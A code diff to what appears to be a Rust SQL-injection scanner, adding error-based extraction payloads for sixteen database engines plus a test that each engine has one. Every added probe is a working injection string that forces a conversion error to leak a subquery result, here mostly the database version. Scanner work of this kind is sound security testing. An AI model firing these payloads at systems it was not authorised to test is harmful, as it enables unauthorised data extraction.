@@ -40,6 +40,7 @@ pub fn generate() -> Vec<GeneratedPayload> {
     let mut out = Vec::new();
     out.extend(fingerprint_probes());
     out.extend(extraction_probes());
+    out.extend(new_family_extraction_probes());
     out
 }
 
@@ -167,6 +168,55 @@ fn extraction_probes() -> Vec<GeneratedPayload> {
             Some(H2),
             Some(SqlClause::Cast),
         ),
+        // SQLite: JSON() reports malformed input and echoes it.
+        probe(
+            "err-sqlite-json",
+            "' AND 1=JSON('~'||(SELECT sqlite_version())||'~')-- -",
+            Some(SQLite),
+            Some(SqlClause::Cast),
+        ),
+    ]
+}
+
+/// Error-based extraction for the sqlmap-parity engine families.
+///
+/// One probe per engine, each using the primitive that engine actually
+/// exposes (see `payload::vectors` for the full per-engine catalogue: this is
+/// the literal probe-layer mirror so the synchronous probe engine can reach
+/// the same engines the adaptive engine can).
+fn new_family_extraction_probes() -> Vec<GeneratedPayload> {
+    use DbmsFamily::*;
+    vec![
+        // Sybase shares T-SQL's conversion error with MSSQL.
+        probe("err-sybase-convert", "' AND 1=CONVERT(int,(SELECT @@version))-- -", Some(Sybase), Some(SqlClause::Cast)),
+        // Firebird: BIN_SHL over a BIGINT cast echoes the operand.
+        probe("err-firebird-bin-shl", "' AND 1=BIN_SHL(CAST('~'||(SELECT rdb$get_context('SYSTEM','ENGINE_VERSION') FROM rdb$database)||'~' AS BIGINT),1)-- -", Some(Firebird), Some(SqlClause::Cast)),
+        // Informix: the character-to-numeric cast quotes the value.
+        probe("err-informix-cast", "' AND 1=CAST('~'||(SELECT TRIM(DBINFO('version','full')) FROM systables WHERE tabid=1)||'~' AS INTEGER)-- -", Some(Informix), Some(SqlClause::Cast)),
+        // HSQLDB.
+        probe("err-hsqldb-cast", "' AND 1=CAST('~'||(SELECT DATABASE_VERSION())||'~' AS int)-- -", Some(HSQLDB), Some(SqlClause::Cast)),
+        // SAP MaxDB.
+        probe("err-maxdb-to-number", "' AND 1=TO_NUMBER('~'||(SELECT version FROM sysinfo.versions)||'~')-- -", Some(MaxDB), Some(SqlClause::Cast)),
+        // SAP HANA.
+        probe("err-hana-cast", "' AND 1=CAST('~'||(SELECT VERSION FROM SYS.M_DATABASE)||'~' AS INTEGER)-- -", Some(SAPHANA), Some(SqlClause::Cast)),
+        // ClickHouse: strict typing names both sides of a bad comparison.
+        probe("err-clickhouse-typing", "' AND 1=('~'||CAST((SELECT version()) AS Nullable(String))||'~')-- -", Some(ClickHouse), Some(SqlClause::Cast)),
+        // CUBRID.
+        probe("err-cubrid-inet-aton", "' AND 1=INET_ATON('~'||(SELECT version())||'~')-- -", Some(Cubrid), Some(SqlClause::Cast)),
+        // Virtuoso.
+        probe("err-virtuoso-bit-shift", "' AND 1=bit_shift(CAST('~'||(SELECT sys_stat('st_dbms_name'))||'~' AS INTEGER),1)-- -", Some(Virtuoso), Some(SqlClause::Cast)),
+        // MonetDB.
+        probe("err-monetdb-ms-trunc", "' AND 1=(SELECT ms_trunc(CAST('~'||CAST((SELECT 1) AS VARCHAR)||'~' AS DECIMAL),1))-- -", Some(MonetDB), Some(SqlClause::Cast)),
+        // Vertica.
+        probe("err-vertica-numeric", "' AND 1=ZEROIFNULL(CAST('~'||(SELECT version())::varchar||'~' AS NUMERIC))-- -", Some(Vertica), Some(SqlClause::Cast)),
+        // InterSystems Cache.
+        probe("err-cache-to-posixtime", "' AND 1=TO_POSIXTIME(TO_DATE('~'||(SELECT 1)||'~','YYYY'))-- -", Some(Cache), Some(SqlClause::Cast)),
+        // Presto / Trino.
+        probe("err-presto-parse-data-size", "' AND 1=PARSE_DATA_SIZE('~'||CAST((SELECT version()) AS VARCHAR)||'~')-- -", Some(Presto), Some(SqlClause::Cast)),
+        // Spanner: ERROR() raises with our string as the message.
+        probe("err-spanner-error-fn", "' AND ERROR('~'||(SELECT 1)||'~') IS NOT NULL-- -", Some(Spanner), Some(SqlClause::Cast)),
+        // Microsoft Access / Jet.
+        probe("err-access-cint", "' AND 1=CINT('~'||(SELECT 1)||'~')-- -", Some(Access), Some(SqlClause::Cast)),
     ]
 }
 
@@ -179,6 +229,22 @@ mod tests {
         let all = generate();
         assert!(all.len() >= 14, "expected a broad probe set, got {}", all.len());
         assert!(all.iter().all(|p| p.probe_type == ProbeType::ErrorInjection));
+    }
+
+    #[test]
+    fn every_engine_family_gets_an_extraction_probe() {
+        // sqlmap ships error-based vectors for 17 engines; the added families
+        // must not be decorative, so each one carries a real primitive.
+        let probes = extraction_probes()
+            .into_iter()
+            .chain(new_family_extraction_probes())
+            .collect::<Vec<_>>();
+        for fam in DbmsFamily::ALL {
+            assert!(
+                probes.iter().any(|p| p.expected_dbms == Some(*fam)),
+                "no error-based extraction probe for {fam:?}"
+            );
+        }
     }
 
     #[test]
